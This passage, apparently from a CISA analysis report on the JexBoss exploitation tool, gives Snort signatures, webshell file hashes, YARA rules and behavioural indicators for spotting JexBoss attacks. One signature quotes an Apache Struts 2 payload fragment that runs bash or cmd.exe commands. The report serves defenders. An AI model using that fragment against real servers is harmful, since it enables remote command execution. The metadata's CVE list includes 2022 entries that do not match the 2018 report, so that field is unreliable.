(msg: \"JexBoss Apache Struts 2 Probe or exploit\"; flow:established,to_server; content: \"GET\"; http_method; content: \"(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift}))\"; fast_pattern; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid: X; rev:1;)\n\n\n3\nThe HTTP User-Agent header value specific to JexBoss (for the deprecated version 1 of the webshell)\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:\" JexBoss User-Agent\"; flow:established,to_server; content: \u201cGET\u201d; http_method; content:\"jexboss\"; http_user_agent; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)\n\n\n\nBehavior Analysis of Network Activity\nThe Snort signatures described in the Network IDS and IPS Signatures section may allow organizations to detect some JexBoss attacks. However, attackers attempting to use stealthier techniques may be able to tune their attacks to avoid detection from these signatures.\nBy analyzing the behavior surrounding the attack, either manually or by using automated tools, network defenders may be able to determine whether an attack has succeeded. NCCIC\u2019s recommended analysis methods include searching for the following:\n\nUnusual outbound connection attempts from the server\n\nUnusual outbound connection attempts may indicate an attacker attempting to initiate a reverse webshell or exfiltrate data.\n\n\nUnusual internet downloads from the server\n\nUnusual internet downloads may indicate that an attacker is attempting to obtain tools to perform additional attacks (e.g., Mimikatz, SQLMap).\n\n\nUnusual URIs being served by the webserver\n\nThe presence of unusual URIs may indicate the installation of a webshell, as is the case when jexws4/jexws4.jsp is used.\n\n\nEmbedded OS commands\n\nNetwork defenders should specifically search for OS commands embedded in HTTP query parameters, HTTP header values, and HTTP POST data in the contents of the organization\u2019s network traffic. For example, the command in the Apache Struts 2 exploit is visible in the cleartext in the Content-Type header. NCCIC recommends organizations analyze their server to identify evidence that OS commands like these have been executed, the presence of which indicates a successful attack.\n\n\n\nCombining the automated analysis of signatures and behavioral indicators may significantly improve false-positive rates and time-to-detection.\nOn-Server Artifacts\nThe JexBoss webshell files included on the JexBoss GitHub page\u2014and available on the joaomatosf[.]com website\u2014are Web Application aRchive (WAR) format files, with the file extension .war. These WAR files are basically ZIP files containing the file jexws.jsp, which is the file in the URI that JexBoss requests in order to perform command execution. The JexBoss webshell .war and .jsp file names may start with jexsw2, jexws3, jexws4, or jbossass.\nTables 6, 7, and 8 include filenames and their associated MD5 checksums for the files related to the JexBoss webshell. Network defenders should search for these files on their organization\u2019s web server file systems, the presence of which indicates a JexBoss webshell.\nThe webshell files provided on the JexBoss GitHub page are identified in table 6.\n\n\nTable 6: JexBoss webshells on GitHub\n\n\n\nFilename\nWebshell Version\nSize (bytes)\nMD5 Checksum\n\n\n\n\njbossass.war\n1\n685\ncbdeaf83f58a64b09df58b94063e0146\n\n\njexws.war and jbossas.war\n2\n1296\n3f156bd68b2a32a1b5cb03af318667f0\n\n\n\nIf the target web server is induced to download the .war file from joaomatosf[.]com (see the Webshell Installation section), the web server will retrieve the latest version of the webshell (currently version 4). NCCIC\u2019s examination of the public files hosted on joaomatosf[.]com revealed the presence of the .war files listed in table 7.\n\n\nTable 7: JexBoss webshells listed on joaomatosf[.]com\n\n\n\nFilename\nWebshell Version\nSize (bytes)\nMD5 Checksum\n\n\n\n\njbossass.war\n4\n1452\n8db88d5d46aa503a697a6940aa10a574\n\n\njexws.war\n4\n1446\nbb8d176207045ff70470c511271f56d9\n\n\njexws2.war\n4\n1448\n13062a85ed1f5c3f4878ff3950a8e222\n\n\njexws3.war\n4\n1448\nf2af83ed4cac1d2c68f82bd8450c7428\n\n\njexws4.war\n4\n1448\na15bf7dd4169069c70ba2f4ee1c62b03\n\n\n\nThe .jsp files within the .war files in tables 6 and 7 are listed in table 8.\n\n\nTable 8: JexBoss .jsp files\n\n\n\nFilename\nWebshell Version\nSize (bytes)\nMD5 Checksum\n\n\n\n\njbossass.jsp\n1\n378\n3cd75a261debd9fb2b16368266fba778\n\n\njexws.jsp\n2\n1812\ne7d94e998f1ec8beb8f33e56607c45f9\n\n\njexws.jsp\n4\n2201\nacda46759d7c3526df2a6c59803586a4\n\n\n\nOnce the .war file is successfully uploaded to the victim web server, JBoss handles the file as if it is a legitimate web application. In the test environment, NCCIC found the original .war and the unzipped .jsp files in a temporary location (/opt/jboss-6.1.0.Final/server/default/tmp), while the contents of the .jsp file were wrapped in a platform-specific class and written to a new file. The contents of the .jsp file were then installed by JBoss in the following location:\n/opt/jboss-6.1.0.Final/server/default/work/jboss.web/localhost/jexws4/org/apache/jsp/jexws4_jsp.java\nAdvanced users of JexBoss can change the names of the webshell files, make minor modifications so that the MD5 checksum differs from those listed in this report, or completely change this webshell to circumvent the methods of detection that focus on the presence of the specific files listed in this report. However, network defenders may still benefit from frequently reviewing web servers for the presence of unwanted files and URIs served by their web server, which may indicate the presence of a webshell or other malware.\nNetwork defenders should carefully examine their organization\u2019s web server logs for indications of malicious web requests, specifically to identify requests that contain OS commands, such as\n\n/bin/bash or uname -a in Linux, or\ncmd.exe or net commands in Windows.\n\nForensic analysts can use the YARA rules provided in figure 17 to search their web server file system for the presence of JexBoss webshell files. These general YARA rules may work better than file hashes to alert on webshell files that attackers have made small changes to in order to evade detection. These general YARA rules will not detect other custom webshells or heavily modified JexBoss webshells.\nrule jexboss_war: webshell{\u00a0\u00a0\u00a0 meta:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 description = \"JexBoss WAR File\"\u00a0\u00a0\u00a0 strings:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $magic = { 50 4b 03 04 ( 14 | 0a ) 00 }\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $string_1 = \"jexws\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $string_2 = \"jbossass\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $jsp_ext = \".jsp\"\n\u00a0\u00a0\u00a0 condition:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $magic at 0 and 1 of ($string_*) and $jsp_ext}\nrule jexboss_jsp: webshell{\u00a0\u00a0\u00a0 meta:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 description = \"JexBoss JSP file\"\u00a0\u00a0\u00a0 strings:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $string_1 = \"getParameter(\\\"ppp\\\")\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $string_2 = \"jexboss\" nocase\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 $string_3 = \"getRuntime().exec(\"\u00a0\u00a0\u00a0 condition:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 all of ($string_*)}\nFigure 17: JexBoss webshell YARA rules\n\nReferences\n\n[1] Cisco Talos Intelligence Blog post on SamSam\n[2] Symantec Internet Security Threat Report \n[3] Exploit Database article on Apache Struts 2 exploit\n\nRevisions\n\nNovember 8, 2018: Initial version\n",
  "cves": [
    "CVE-2022-42475",
    "CVE-2022-47966",
    "CVE-2017-5638"
  ],
  "techniques": [],
  "advisory": "ar18-312a",
  "title": "JexBoss \u2013 JBoss Verify and EXploitation Tool | CISA",
  "source": "analysis-reports",
  "id": "9e73da3b8d8896a5d1884aa9a51c70c4f0024107dc49d7c6777edeae31e5f928"
}